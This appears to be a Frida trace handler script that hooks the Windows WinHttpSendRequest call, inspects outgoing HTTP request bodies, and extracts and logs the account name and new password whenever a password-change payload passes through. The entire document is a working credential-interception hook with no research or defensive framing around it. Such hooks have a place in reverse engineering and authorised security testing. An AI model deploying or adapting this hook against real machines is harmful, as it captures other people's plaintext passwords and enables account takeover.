defineHandler({
    onEnter(log, args, state) {
        log('[GET] WinHttpSendRequest');

        const rawData = args[3].readAnsiString();

        if (rawData.includes("NewPassword")) {
            log(rawData);

            try {
                const cleanedJson = rawData.replace(/0x[0-9a-fA-F]+/g, match => parseInt(match, 16));
                const obj = JSON.parse(cleanedJson);

                const username = obj.AccountName;
                const password = obj.NewPassword;

                log(` --> Username: ${username} / Password: ${password}`);
            } catch (err) {
                log(` --> Error parsing JSON or extracting credentials: ${err.message}`);
            }
        }
    },

    onLeave(log, retval, state) {
        // No operation
    }
});
